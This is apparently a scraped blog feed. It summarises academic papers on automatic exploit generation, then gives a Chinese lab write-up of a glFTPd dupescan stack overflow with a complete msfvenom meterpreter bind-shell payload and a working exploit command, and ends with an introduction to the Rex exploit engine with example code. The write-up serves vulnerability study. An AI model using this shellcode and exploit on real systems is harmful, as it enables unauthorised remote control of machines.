this paper we present AEG, the first end-to-end system for fully automatic exploit generation. We used AEG to analyze 14 open-source projects and successfully generated 16 control flow hijacking exploits. Two of the generated exploits (expect-5.43 and htget-0.93) are zero-day exploits against unknown vulnerabilities. Our contributions are:1) we show how exploit generation for control flow hijack attacks can be modeled as a formal verification problem,2) we propose preconditioned symbolic execution, a novel technique for targeting symbolic execution,3) we present a general approach for generating working exploits once a bug is found, and4) we build the first end-to-end system that automatically finds vulnerabilities and generates exploits that produce a shell. Comment: AEG 为基于源码的自动利用方案：为了克服 APEG 对于补丁依赖以及无法构造控制流劫持的缺陷，在 2011 年的 NDSS 会议上，T.Avgerinos 等人首次提出了一种有效的漏洞自动挖掘和利用方法 AEG。该方法的核心思想是借助程序验证技术找出能够满足使得程序进入非安全状态且可被利用的输入，其中非安全状态包括内存越界写、恶意的格式化字符串等，可被利用主要是指程序的 EIP 被任意操纵。其具体流程为:首先，在预处理阶段，利用 GNU C 编译器构建二进制程序以及通过 LLVM 生成所需的字节码信息;其次，在实际分析的过程中，AEG 首先通过源码分析以及符号执行找出存在错误的位置，并通过路径约束条件生成相应的输入;之后，AEG 利用动态分析方法提取程序运行时的各类信息，例如栈上脆弱缓冲区的地址、脆弱函数的返回地址以及在漏洞触发之前的其他环境数据等;随后，综合漏洞利用约束条件以及动态运行时环境信息，最终构建可利用样本。通过对 14 组真实程序漏洞的自动利用实验，证明了该方法的可靠性和有效性。AEG 集成了优化后的符号执行和动态指令插装技术，实现了从软件漏洞自动挖掘到软件漏洞自动利用的整个过程，并且生成的利用样本直接具备控制流劫持能力，是第一个真正意义上的面向控制流漏洞利用的自动化构建方案。该方案的局限性主要体现在:首先，该方案需要依赖源代码进行程序错误搜索;其次，所构造的利用样本主要是面向栈溢出或者字符串格式化漏洞，并且利用样本受限于编译器和动态运行环境等因素。 –《软件漏洞自动利用研究进展》 《Automatic Exploit Generation》123456@article&#123; title=&#123;Automatic Exploit Generation&#125;, author=&#123;Thanassis Avgerinos, Sang Kil Cha&#125;, booktitle=&#123;communications of the acm&#125;, year=&#123;2014&#125;&#125; Abstract:Attackers commonly exploit buggy programs to break into computers. Security-critical bugs pave the way for attackers to install trojans, propagate worms, and use victim computers to send spam and launch denial-of-service attacks. A direct way, therefore, to make computers more secure is to find securitycritical bugs before they are exploited by attackers.Unfortunately, bugs are plentiful. For example, the Ubuntu Linux bug-management database listed more than 103,000 open bugs as of January 2013. Specific widely used programs (such as the Firefox Web browser and the Linux 3.x kernel) list 7,597 and 1,293 open bugs in their public bug trackers, respectively. Other projects, including those that are closed-source, likely involve similar statistics. These are just the bugs we know; there is always the persistent threat of zero-day exploits, or attacks against previously unknown bugs.Among the thousands of known bugs, which should software developers fix first? Which are exploitable? 《Unleashing MAYHEM on Binary Code》123456@article&#123; title=&#123;Unleashing MAYHEM on Binary Code&#125;, author=&#123;Sang Kil Cha, Thanassis Avgerinos, Alexandre Rebert and David Brumley&#125;, booktitle=&#123;S&amp;P&#125;, year=&#123;2012&#125;&#125; Abstract:In this paper we present MAYHEM, a new system for automatically finding exploitable bugs in binary (i.e., executable) programs. Every bug reported by MAYHEM is accompanied by a working shell-spawning exploit. The working exploits ensure soundness and that each bug report is security-critical and actionable. MAYHEM works on raw binary code without debugging information. To make exploit generation possible at the binary-level, MAYHEM addresses two major technical challenges: actively managing execution paths without exhausting memory, and reasoning about symbolic memory indices, where a load or a store address depends on user input. To this end, we propose two novel techniques:1) hybrid symbolic execution for combining online and offline (concolic) execution to maximize the benefits of both techniques, and2) index-based memory modeling, a technique that allows MAYHEM to efficiently reason about symbolic memory at the binary level.We used MAYHEM to find and demonstrate 29 exploitable vulnerabilities in both Linux and Windows programs, 2 of which were previously undocumented. Comment: 基于二进制的自动利用方案：为了摆脱对源代码的依赖以及保证系统适用场景的广泛性，S.K.Cha 等人在 2012 年的 IEEE S&amp;P 会议上提出了基于二进制程序的漏洞利用自动生成方法 Mayhem。该方法通过综合利用在线式符号执行的速度优势和离线式符号执行的内存低消耗特点，并通过基于索引的内存模型构建，进而实现较为实用化的漏洞挖掘与利用自动生成方法。其具体流程如下:首先，通过构建两个并行的符号执行子系统，具体执行和符号执行子系统;其次，对于具体执行子系统，通过引入污点传播技术，寻找程序执行过程中，由用户输入所能控制的所有 jmp 指令或者 call 指令，并将其作为 bug 候选项交给符号执行子系统;之后，符号执行系统将所有接收到的污点指令转化为中间指令，并进行执行路径约束构建和可利用约束构建;最后，符号执行系统通过约束求解器来寻找满足路径可达条件和漏洞可利用条件的利用样本。在实际进行符号执行的过程中，为了保证效率问题，Mayhem 系统使用了一种基于索引的内存模型用来优化处理符号化内存的加载问题，进而使其成为一种高使用性的漏洞自动利用方案。目前 Mayhem 的局限性主要集中在以下三个方面:首先，系统只能建模部分系统或者库函数，因此无法高效处理大型程序;其次，系统无法处理多线程交互问题，例如消息传递和共享内存问题;最后，由于使用了污点传播方法，同样具有漏传和误传等典型问题。 –By：《软件漏洞自动利用研究进展》 《Q: Exploit Hardening Made Easy》123456@article&#123; title=&#123;Q: Exploit Hardening Made Easy&#125;, author=&#123;Edward J. Schwartz, Thanassis Avgerinos and David Brumley&#125;, booktitle=&#123;USENIX Security&#125;, year=&#123;2011&#125;&#125; Abstract:Prior work has shown that return oriented programming (ROP) can be used to bypass W⊕X, a software defense that stops shellcode, by reusing instructions from large libraries such as libc. Modern operating systems have since enabled address randomization (ASLR), which randomizes the location of libc, making these techniques unusable in practice. However, modern ASLR implementations leave smaller amounts of executable code unrandomized and it has been unclear whether an attacker can use these small code fragments to construct payloads in the general case.In this paper, we show defenses as currently deployed can be bypassed with new techniques for automatically creating ROP payloads from small amounts of unrandomized code. We propose using semantic program verification techniques for identifying the functionality of gadgets, and design a ROP compiler that is resistant to missing gadget types. To demonstrate our techniques, we build Q, an end-to-end system that automatically generates ROP payloads for a given binary. Q can produce payloads for 80% of Linux /usr/bin programs larger than 20KB. We also show that Q can automatically perform exploit hardening: given an exploit that crashes with defenses on, Q outputs an exploit that bypasses both W⊕X and ASLR. We show that Q can harden nine realworld Linux and Windows exploits, enabling an attacker to automatically bypass defenses as deployed by industry for those programs. Comment: ROP 代码自动生成方案：为了解决数据执行保护和地址随机化给控制流劫持类漏洞利用带来的困扰，在 2011 年的 USENIX Security 会议上，E.J.Schwartz 等人实现了一套面向高可靠性漏洞利用的 ROP 代码自动生成方法 Q。其核心思想是收集目标程序中的 Gadget 并通过面向 Gadget 的编程语言自动构建 ROP。具体的流程主要如下:首先，向 Q 提供未随机化的脆弱程序或者其他二进制库，并由 Q 找出具备特定功能的 Gadget 集合;其次，利用 Q 提供的编程语言 QooL 实现满足特定语义功能的目标代码，并通过 Q 将目标代码编译为面向 Gadget 的指令序列;随后，通过利用已获取的 Gadget 集合填充上一步得到的指令序列，从而形成最终的 ROP 代码。通过对 9 个真实软件漏洞的实验，可以看到在开启数据执行保护和地址随机化功能后，通过 Q 仍然可以保证这些漏洞利用代码稳定执行。Q 方案证明了在含有少量未随机化代码的系统中仍可以有效自动构建 ROP 代码，进而强化了面向控制流劫持类漏洞利用在真实环境下的攻击效果。Q 方案本身的局限性主要体现在:首先，Q 方案未考虑自动构建不含 ret 指令的 ROP;其次，Q 方案仅从实际应用效果出发，没有考虑满足图灵完备性。 –By：《软件漏洞自动利用研究进展》 《Automatic Patch-Based Exploit Generation is Possible:Techniques and Implications》123456@article&#123; title=&#123;Automatic Patch-Based Exploit Generation is Possible:Techniques and Implications&#125;, author=&#123;David Brumley, Dawn Song, Jiang Zheng&#125;, booktitle=&#123;S&amp;P&#125;, year=&#123;2008&#125;&#125; Abstract: The automatic patch-based exploit generation problem is: given a program P and a patched version of the program P′, automatically generate an exploit for the potentially unknown vulnerability present in P but fixed in P′. In this paper, we propose techniques for automatic patch-based exploit generation, and show that our techniques can automatically generate exploits for 5 Microsoft programs based upon patches provided via Windows Update. Although our techniques may not work in all cases, a fundamental tenant of security is to conservatively estimate the capabilities of attackers. Thus, our results indicate that automatic patch-based exploit generation should be considered practical. One important security implication of our results is that current patch distribution schemes which stagger patch distribution over long time periods, such as Windows Update, may allow attackers who receive the patch first to compromise the significant fraction of vulnerable hosts who have not yet received the patch. Comment: 在 2008 年的 IEEE S&amp;P 会议上，D.Brumley 等人首次提出了基于二进制补丁比较的漏洞 利用自动生成方法 APEG。其核心思路是基于以下的假设条件，即补丁程序中增加了对触发原程序崩溃的过滤条件。因此，只要能够找到补丁程序中添加过滤条件的位置，同时构造不满足过滤条件的“违规”输入，即可认为是原始程序的一个可利用的输入候选项。根据其具体介绍内容可知，该工作主要分为三个步骤:首先，利用二进制差异比较工具(例如 BinDiff 与 EBDS 等)找到补丁存在的位置，即补丁程序的检测点;其次，找出不满足补丁程序检测点的输入数据作为原始程序的利用候选项;最后，利用污点传播等监控方法筛选所有能够对原始程序造成溢出或者控制流劫持等崩溃发生的有效利用。根据对微软所发布的多个补丁程序的实验结果表明，该方法具有较强的可靠性和实用性。APEG 是对漏洞利用自动化构建的首次尝试，虽然核心思想较为简单，但由于其具有很强的可操作性，因此也得到了其他研究人员的普遍认可。然而 APEG 的局限性主要体现在两个方面:首先，该方法无法处理补丁程序中不添加过滤判断的情况，例如，为了修复缓冲区溢出而增加缓冲区长度的补丁程序;其次，从实际利用效果来看，所构造的利用类型主要属于拒绝服务，即只能造成原程序的崩溃，而无法造成直接的控制流劫持。 – By 《软件漏洞自动利用研究进展》 《Revery: From Proof-of-Concept to Exploitable》123456@article&#123; title=&#123;Revery: From Proof-of-Concept to Exploitable&#125;, author=&#123;Yan Wang, Chao Zhang&#125;, booktitle=&#123;CCS&#125;, year=&#123;2018&#125;&#125; Abstract:Automatic exploit generation is an open challenge. Existing solutions usually explore in depth the crashing paths, i.e., paths taken by proof-of-concept (PoC) inputs triggering vulnerabilities, and generate exploits when exploitable states are found along the paths. However, exploitable states do not always exist in crashing paths. Moreover, existing solutions heavily rely on symbolic execution and are not scalable in path exploration and exploit generation. In addition, few solutions could exploit heap-based vulnerabilities.In this paper, we propose a new solution Revery to search for exploitable states in paths diverging from crashing paths, and generate control-flow hijacking exploits for heap-based vulnerabilities. It adopts three novel techniques: (1) a layout-contributor digraph to characterize a vulnerability’s memory layout and its contributor instructions; (2) a layout-oriented fuzzing solution to explore diverging paths, which have similar memory layouts as the crashing paths, in order to search more exploitable states and generate corresponding diverging inputs; (3) a control-flow stitching solution to stitch crashing paths and diverging paths together, and synthesize EXP inputs able to trigger both vulnerabilities and exploitable states.We have developed a prototype of Revery based on the binary analysis engine angr, and evaluated it on a set of 19 CTF (capture the flag) programs. Experiment results showed that it could generate exploits for 9 (47%) of them, and generate EXP inputs able to trigger exploitable states for another 5 (26%) of them. 《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》12345@article&#123; title=&#123;Automatic Polymorphic Exploit Generation for Software Vulnerabilities&#125;, author=&#123;Minghua Wang, Purui Su, Qi Li, Lingyun Ying, Yi Yang, Dengguo Feng&#125;, year=&#123;2013&#125;&#125; Abstract:Generating exploits from the perspective of attackers is an effective approach towards severity analysis of known vulnerabilities. However, it remains an open problem to generate even one exploit using a program binary and a known abnormal input that crashes the program, not to mention multiple exploits. To address this issue, in this paper, we propose PolyAEG, a system that automatically generates multiple exploits for a vulnerable program using one corresponding abnormal input. To generate polymorphic exploits, we fully leverage different trampoline instructions to hijack control flow and redirect it to malicious code in the execution context. We demonstrate that, given a vulnerable program and one of its abnormal inputs, our system can generate polymorphic exploits for the program. We have successfully generated control flow hijacking exploits for 8 programs in our experiment. Particularly, we have generated 4,724 exploits using only one abnormal input for IrfanView, a widely used picture viewer. 《Exploit Generation for Information Flow Leaks in Object-Oriented Programs》123456@article&#123; title=&#123;Exploit Generation for Information Flow Leaks in Object-Oriented Programs&#125;, author=&#123;Quoc Huy Do, Richard Bubel, Reiner&#125;, booktitle=&#123;IFIP&#125;, year=&#123;2015&#125;&#125; Abstract:We present a method to generate automatically exploits for information flow leaks in object-oriented programs. Our approach combines self-composition and symbolic execution to compose an insecurity formula for a given information flow policy and a specification of the security level of the program locations. The insecurity formula gives then rise to a model which is used to generate input data for the exploit.A prototype tool called KEG implementing the described approach for Java programs has been developed, which generates exploits as executable JUnit tests. 《Survey of Automated Vulnerability Detection and Exploit Generation Techniques in Cyber Reasoning Systems》123456@article&#123; title=&#123;Survey of Automated Vulnerability Detection and Exploit Generation Techniques in Cyber Reasoning Systems&#125;, author=&#123;Teresa Nicole Brooks&#125;, booktitle=&#123;AISC&#125;, year=&#123;2018&#125;&#125; Abstract:Software is everywhere, from mission critical systems such as industrial power stations, pacemakers and even household appliances. This growing dependence on technology and the increasing complexity of software has serious security implications as it means we are potentially surrounded by software that contains exploitable vulnerabilities. These challenges have made binary analysis an important area of research in computer science and has emphasized the need for building automated analysis systems that can operate at scale, speed and efficiency; all while performing with the skill of a human expert. Though great progress has been made in this area of research, there remains limitations and open challenges to be addressed. Recognizing this need, DARPA sponsored the Cyber Grand Challenge (CGC), a competition to showcase the current state of the art in systems that perform; automated vulnerability detection, exploit generation and software patching. This paper is a survey of the vulnerability detection and exploit generation techniques, underlying technologies and related works of two of the winning systems Mayhem and Mechanical Phish. 《Towards Automated Exploit Generation for Embedded Systems》123456@article&#123; title=&#123;Towards Automated Exploit Generation for Embedded Systems&#125;, author=&#123;Matthew Ruffell, Jin B. Hong, Hyoungshick Kim, Dong Seong Kim&#125;, booktitle=&#123;LNCS&#125;, year=&#123;2017&#125;&#125; Abstract:Manual vulnerability discovery and exploit development on an executable are very challenging tasks for developers. Therefore, the automation of those tasks is becoming interesting in the field of software security. In this paper, we implement an approach of automated exploit generation for firmware of embedded systems by extending an existing dynamic analysis framework called Avatar. Embedded systems occupy a significant portion of the market but lack typical security features found on general purpose computers, making them prone to critical vulnerabilities. We discuss several techniques to automatically discover vulnerabilities and generate exploits for embedded systems, and evaluate our proposed approach by generating exploits for two vulnerable firmware written for a popular ARM Cortex-M3 microcontroller. 《Transformation-aware Exploit Generation using a HI- CFG》12345@article&#123; title=&#123;Transformation-aware Exploit Generation using a HI- CFG&#125;, author=&#123;Dan Caselden, Alex Bazhanyuk, Mathias Payer, Dawn Song&#125;, year=&#123;2013&#125;&#125; Abstract:A common task for security analysts is to determine whether potentially unsafe code constructs (as found by static analysis or code review) can be triggered by an attackercontrolled input to the program under analysis. We refer to this problem as proof-of-concept (POC) exploit generation. Exploit generation is challenging to automate because it requires precise reasoning across a large code base; in practice it is usually a manual task. An intuitive approach to exploit generation is to break down a program?s relevant computation into a sequence of transformations that map an input value into the value that can trigger an exploit. We automate this intuition by describing an approach to discover the buffer structure (the chain of buffers used between transformations) of a program, and use this structure to construct an exploit input by inverting one transformation at a time. We propose a new program representation, a hybrid information- and control-flow graph (HI-CFG), and give algorithms to build a HI-CFG from instruction traces. We then describe how to guide program exploration using symbolic execution to efficiently search for transformation pre-images. We implement our techniques in a tool that operates on applications in x86 binary form. In two case studies we discuss how our tool creates POC exploits for (i) a vulnerability in a PDF rendering library that is reachable through multiple different transformation stages and (ii) a vulnerability in the processing stage of a specific document format in AbiWord. 《System Service Call-oriented Symbolic Execution of Android Framework with Applications to Vulnerability Discovery and Exploit Generation》123456@article&#123; title=&#123;System Service Call-oriented Symbolic Execution of Android Framework with Applications to Vulnerability Discovery and Exploit Generation&#125;, author=&#123;Lannan Luo, Qiang Zeng, Chen Cao, Kai Chen, Jian Liu&#125;, booktitle=&#123;MobiSys’17&#125;, year=&#123;2017&#125;&#125; Abstract:Android Application Framework is an integral and foundational part of the Android system. Each of the 1.4 billion Android devices relies on the system services of Android Framework to manage applications and system resources. Given its critical role, a vulnerability in the framework can be exploited to launch large-scale cyber attacks and cause severe harms to user security and privacy. Recently, many vulnerabilities in Android Framework were exposed, showing that it is vulnerable and exploitable. However, most of the existing research has been limited to analyzing Android applications, while there are very few techniques and tools developed for analyzing Android Framework. In particular, to our knowledge, there is no previous work that analyzes the framework through symbolic execution, an approach that has proven to be very powerful for vulnerability discovery and exploit generation. We design and build the first system, Centaur, that enables symbolic execution of Android Framework. Due to some unique characteristics of the framework, such as its middleware nature and extraordinary complexity, many new challenges arise and are tackled in Centaur. In addition, we demonstrate how the system can be applied to discovering new vulnerability instances, which can be exploited by several recently uncovered attacks against the framework, and to generating PoC exploits.","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[]},{"title":"OSVDB-ID#16373（glFTPd）栈溢出漏洞分析与复现","slug":"OSVDB-16373-glFTPd","date":"2019-03-29T09:14:23.000Z","updated":"2019-03-29T14:06:29.733Z","comments":true,"path":"2019/03/29/OSVDB-16373-glFTPd/","link":"","permalink":"http://maskhed.github.io/2019/03/29/OSVDB-16373-glFTPd/","excerpt":"glFTPd is a very advanced ftp server with lots of possibilities. One of the main differences between many other ftp servers and glFTPd is that it has its own user database which can be completely maintained online using ftp site commands. Using ftp site commands it is also possible to see stats, view logs, execute scripts and do many more things. glFTPd runs within a chroot environment which makes it relatively safe. The glFTPd team continuously works on improving this free piece of beautiful software.","text":"glFTPd is a very advanced ftp server with lots of possibilities. One of the main differences between many other ftp servers and glFTPd is that it has its own user database which can be completely maintained online using ftp site commands. Using ftp site commands it is also possible to see stats, view logs, execute scripts and do many more things. glFTPd runs within a chroot environment which makes it relatively safe. The glFTPd team continuously works on improving this free piece of beautiful software. 0x01 漏洞描述 0x02 漏洞原理1、源码溢出点位于 dupescan.c 的 main() 函数中。调用 strcpy() 时未进行安全检查，导致缓冲区溢出。 2、编译编译 ./glftpd-LNX_1.24/bin/sources 目录下的 dupescan.c 文件，生成 dupescan。gcc 命令如下：1gcc -Wall -g -z execstack -fno-stack-protector -no-pie -z norelro -o dupescan dupescan.c 编译完成后，查看 dupescan 安全机制开启情况：12345678$ checksec dupescan[*] '/root/AEG_DataSet/glftpd-LNX_1.24/bin/sources/dupescan' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 3、汇编查看 dupescan 汇编代码，溢出点如下图所示。可知，dupename[255] 地址为 rbp-0x110。 0x03 漏洞复现基于以上分析，构造 PoC 并通过 GDB 对 dupescan 进行调试。 12# gdb 加载 PoCrun $(python -c 'print \"A\"*272 + \"BBBBBBBB\" + \"CCCCCC\"') PoC 成功导致栈溢出，查看崩溃现场，RBP 被覆盖为 0x4242424242424242、RIP 被覆盖为 0x0000434343434343。 0x04 Exploit在编译 dupescan 时已关闭 NX、PIE 等安全选项，因此可使用 ret2text 的方式编写 Exp。 1、shellcode使用 MSFvenom 生成 shellcode，shellcode 功能为监听本地 3333 端口，当客户端发起连接时返回 meterpreter。生成命令如下：12345678910111213141516171819202122$ msfvenom -a x64 --platform linux -p linux/x64/meterpreter/bind_tcp LPORT=3333 -b '\\x00' -f python --smallestFound 3 compatible encodersAttempting to encode payload with 1 iterations of generic/nonegeneric/none failed with Encoding failed due to a bad character (index=19, char=0x00)Attempting to encode payload with 1 iterations of x64/xorx64/xor succeeded with size 119 (iteration=0)Attempting to encode payload with 1 iterations of x64/xor_dynamicx64/xor_dynamic succeeded with size 128 (iteration=0)x64/xor chosen with final size 119Payload size: 119 bytesFinal size of python file: 586 bytesbuf = \"\"buf += \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\"buf += \"\\xef\\xff\\xff\\xff\\x48\\xbb\\xc1\\xd5\\xa8\\x54\\x32\\x5c\\x5c\"buf += \"\\x27\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\"buf += \"\\xab\\xfc\\xf0\\xcd\\x58\\x5e\\x03\\x4d\\xc0\\x8b\\xa7\\x51\\x7a\"buf += \"\\xcb\\x0e\\xe0\\xc5\\xf1\\xaa\\x54\\x3f\\x59\\x14\\xae\\x27\\xbf\"buf += \"\\xb8\\x0e\\x58\\x6d\\x04\\x28\\xc4\\x8c\\xc2\\x66\\x6a\\x53\\x59\"buf += \"\\x6f\\x57\\xbf\\x83\\x0c\\x3d\\x59\\x0c\\x71\\x9e\\xbf\\xa1\\x0c\"buf += \"\\xab\\xea\\x4c\\x6f\\x48\\x03\\xe5\\x65\\xfb\\x36\\x7e\\x66\\x9b\"buf += \"\\x67\\xaf\\x5b\\x37\\x14\\xca\\x6f\\x56\\x8a\\xa7\\x51\\xcd\\xba\"buf += \"\\x5c\\x27\" 2、Exp使用 0x7fffffffe0b0 作为返回地址。构造 Exp 如下： 1$(python -c 'print \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xc1\\xd5\\xa8\\x54\\x32\\x5c\\x5c\\x27\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xab\\xfc\\xf0\\xcd\\x58\\x5e\\x03\\x4d\\xc0\\x8b\\xa7\\x51\\x7a\\xcb\\x0e\\xe0\\xc5\\xf1\\xaa\\x54\\x3f\\x59\\x14\\xae\\x27\\xbf\\xb8\\x0e\\x58\\x6d\\x04\\x28\\xc4\\x8c\\xc2\\x66\\x6a\\x53\\x59\\x6f\\x57\\xbf\\x83\\x0c\\x3d\\x59\\x0c\\x71\\x9e\\xbf\\xa1\\x0c\\xab\\xea\\x4c\\x6f\\x48\\x03\\xe5\\x65\\xfb\\x36\\x7e\\x66\\x9b\\x67\\xaf\\x5b\\x37\\x14\\xca\\x6f\\x56\\x8a\\xa7\\x51\\xcd\\xba\\x5c\\x27\" + \"A\"*153 + \"BBBBBBBB\" + \"\\xb0\\xe0\\xff\\xff\\xff\\x7f\"') 使用 GDB 加载 dupescan 并执行 Exp，可在本地开启 3333 端口，并监听。 使用 MSF 连接靶机 3333 端口，即可获得靶机shell。 0x05 小结本文简要分析了 glFTPd 栈溢出漏洞的成因，并通过 GDB 进行了复现。在此基础上，使用 MSF 生成具有 bind_tcp 功能的 shellcode，以 ret2text 的方式编写 Exp，最终获取到靶机的完全控制权限。 参考文献： glFTPd Home Linux: glFTPd Buffer Overflow Vulnerability Security Focus glFTPd (Slackware 9.0/9.1/10.0) - Local Stack Overflow","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[]},{"title":"Exploit 自动生成引擎 Rex","slug":"rex-1","date":"2019-03-28T03:24:23.000Z","updated":"2019-03-29T09:30:08.532Z","comments":true,"path":"2019/03/28/rex-1/","link":"","permalink":"http://maskhed.github.io/2019/03/28/rex-1/","excerpt":"来自 UCSB 的团队 Shellphish，为参加 DARPA 举办的 CGC 竞赛，设计并实现了 CRS（Cyber Reasoning System）Mechaphish。该系统包含自动化漏洞挖掘模块 Driller、Exploit自动生成引擎 Rex、自动补丁模块 Patcherex 以及 ropchain 生成模块 angrop。本文主要对其中的 Exploit 自动生成引擎 Rex 进行介绍，通过分析 Rex 源码，重点对 Crash 复现及可利用判断部分进行说明。弟作为一只资深菜鸡，文中难免存在不当之处，望各位师傅指正 Orz…","text":"来自 UCSB 的团队 Shellphish，为参加 DARPA 举办的 CGC 竞赛，设计并实现了 CRS（Cyber Reasoning System）Mechaphish。该系统包含自动化漏洞挖掘模块 Driller、Exploit自动生成引擎 Rex、自动补丁模块 Patcherex 以及 ropchain 生成模块 angrop。本文主要对其中的 Exploit 自动生成引擎 Rex 进行介绍，通过分析 Rex 源码，重点对 Crash 复现及可利用判断部分进行说明。弟作为一只资深菜鸡，文中难免存在不当之处，望各位师傅指正 Orz… 一、概述Exploit 自动生成引擎 Rex 在硬件模拟器 QEMU 与二进制分析平台 angr 的基础上，通过 Concolic Execution 实现 Exploit 的自动生成。将待分析的应用程序及导致应用程序崩溃的 Crash 作为系统输入，Rex 将复现崩溃路径，并对崩溃时的寄存器状态及内存布局进行分析，判断 Crash 的可利用性，并自动生成 Exploit。 源码中对漏洞类型的定义: 二、安装安装 Rex 存在两种方式：1）安装 Mechaphish，安装文档；2）仅安装 Rex，参考文档。二者的差别在于 Mechaphish 包含漏洞挖掘模块 Driller、自动利用模块 Rex、自动补丁模块 Patcherex 以及 ropchain 生成模块 angrop。由于各模块之间相互独立，因此本文选择仅安装自动利用模块 Rex。本地环境采用 Ubuntu 16.04.5 Desktop(64 bit)。部署过程中，Rex 所需依赖如下: 安装依赖过程中部分路径需要调整，根据提示信息修改即可。各个依赖所承担的功能如下： 组件名称 功能 angr A powerful and user-friendly binary analysis platform! tracer Utilities for generating dynamic traces. angrop angrop is a rop gadget finder and chain builder. compilerex POV templates and compilation support for CGC binaries. compilerex is a hacky cgc binary compiler shellphish-qemu Shellphish’s pip-installable package of QEMU povsim POV simulation for CGC. 安装完成后，使用以下代码对 Rex 的功能进行测试。 12345678910111213141516171819202122232425262728293031# triage a crash&gt;&gt;&gt; crash = rex.Crash(\"./legit_00003\", b\"\\x00\\x0b1\\xc1\\x00\\x0c\\xeb\\xe4\\xf1\\xf1\\x14\\r\\rM\\r\\xf3\\x1b\\r\\r\\r~\\x7f\\x1b\\xe3\\x0c`_222\\r\\rM\\r\\xf3\\x1b\\r\\x7f\\x002\\x7f~\\x7f\\xe2\\xff\\x7f\\xff\\xff\\x8b\\xc7\\xc9\\x83\\x8b\\x0c\\xeb\\x80\\x002\\xac\\xe2\\xff\\xff\\x00t\\x8bt\\x8bt_o_\\x00t\\x8b\\xc7\\xdd\\x83\\xc2t~n~~\\xac\\xe2\\xff\\xff_k_\\x00t\\x8b\\xc7\\xdd\\x83\\xc2t~n~~\\xac\\xe2\\xff\\xff\\x00t\\x8bt\\x8b\\xac\\xf1\\x83\\xc2t~c\\x00\\x00\\x00~~\\x7f\\xe2\\xff\\xff\\x00t\\x9e\\xac\\xe2\\xf1\\xf2@\\x83\\xc3t\")&gt;&gt;&gt; crash.crash_types['write_what_where']&gt;&gt;&gt; crash.explorable()True# explore the crash by setting segfaulting pointers to sane values and re-tracing&gt;&gt;&gt; crash.explore()# now we can see that we control instruction pointer&gt;&gt;&gt; crash.crash_types'ip_overwrite'# generate exploits based off of this crash# it may take several minutes&gt;&gt;&gt; arsenal = crash.exploit()# we generated a type 1 POV for every register&gt;&gt;&gt; len(arsenal.register_setters) # we generate one circumstantial register setter, one shellcode register setter2# and one Type 2 which can leak arbitrary memory&gt;&gt;&gt; len(arsenal.leakers)1# exploits are graded based on reliability, and what kind of defenses they can# bypass, the two best exploits are put into the 'best_type1' and 'best_type2' attributes&gt;&gt;&gt; arsenal.best_type1.register'ebp'# exploits can be dumped in C, Python, or as a compiled POV&gt;&gt;&gt; arsenal.best_type2.dump_c('legit3_x.c')&gt;&gt;&gt; arsenal.best_type2.dump_python('legit3_x.py')&gt;&gt;&gt; arsenal.best_type2.dump_binary('legit3_x.pov')# also POVs can be tested against a simulation of the CGC architecture&gt;&gt;&gt; arsenal.best_type1.test_binary()True 测试结果如下： 三、源码分析查看 Rex 源码的目录结构： 分析各类之间的依赖关系，从逻辑上大致可分为四部分： Exploit_factory：调用各模块，负责自动生成 Exploit； Crash：复现崩溃路径，判定 Crash 的可利用性； Technique：对于可利用的 Crash，采用针对性的技术，生成 Exploit； Shellcode_factory：shellcode 仓库，根据需要选用合适的 Shellcode。 下文重点对 Crash 可利用性判定部分进行分析。 四、Crash 可利用性判定Rex 以 Concolic Execution 的方式复现 crash 路径，分析崩溃时寄存器状态及内存布局，并对 crash 的可利用性进行判定，相关功能代码集中在 Crash.py 中。对原理感兴趣的同学可以参考论文《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》，以下是对论文原文的引用： Vulnerable States. Unlike AEG/Mayhem, but similar to AXGEN, we generate exploits by performing concolic execution on crashing program inputs using angr. We drive concolic execution forward, forcing it to follow the same path as a dynamic trace gathered by concretely executing the crashing input applied to the program. Concolic execution is stopped at the point where the program crashed, and we inspect the symbolic state to determine the cause of the crash and measure exploitability. By counting the number of symbolic bits in certain registers, we can triage a crash into a number of categories such as frame pointer overwrite, instruction pointer overwrite, or arbitrary write, among others. 1、Concrete ExecutionConcolic Execution 原理请感兴趣的同学自行查阅。angr 在实现 concolic execution 时，需要提供 crash_addr。 因此，通过 QEMU 加载二进制程序及 PoC，以获取 crash_addr。相关功能在 Tracer 模块中实现。 Crash.py 中调用 Tracer 模块的代码如下：1234tracer_args=&#123;'ld_linux': os.path.join(bin_location, 'tests/i386/ld-linux.so.2'),'library_path': os.path.join(bin_location, 'tests/i386')&#125;r = tracer.QEMURunner(binary=binary, input=input_data, argv=argv, trace_timeout=trace_timeout, **tracer_args) 2、Concolic Execution在获取 crash_addr 之后，对 angr 进行配置，并执行 Concolic Execution。 其中，较为关键的配置包括： 初始状态设定 State Plugin 选择 路径探索策略。 （1）初始状态设定配置 simulation_manager 中的 save_unconstrained 参数。 其中 r 为 tracer.QEMURunner() 返回值，当 PoC 成功触发崩溃时 r.crash_mode 为 True，失败时为 False。 通过 full_init_state()方法，设置程序的初始状态： 设置 tracing 模式：mode = ‘tracing’ add_options: Option name Description so.MEMORY_SYMBOLIC_BYTES_MAP Maintain a mapping of symbolic variable to which memory address it “really” corresponds to, at the paged memory level? so.TRACK_ACTION_HISTORY track the history of actions through a path (multiple states). This action affects things on the angr level so.CONCRETIZE_SYMBOLIC_WRITE_SIZES Concretize the sizes of symbolic writes to memory so.CONCRETIZE_SYMBOLIC_FILE_READ_SIZES Concreteize the sizes of file reads so.TRACK_MEMORY_ACTIONS Keep a SimAction for each memory read and write remove_options:由于 ‘tracing’ 模式下预制了一些选项，因此在优化策略时，不仅需要add_options，而且需要 remove_options。定义在./angr/sim_options.py中： Option name Description so.TRACK_REGISTER_ACTIONS Keep a SimAction for each register read and write so.TRACK_TMP_ACTIONS Keep 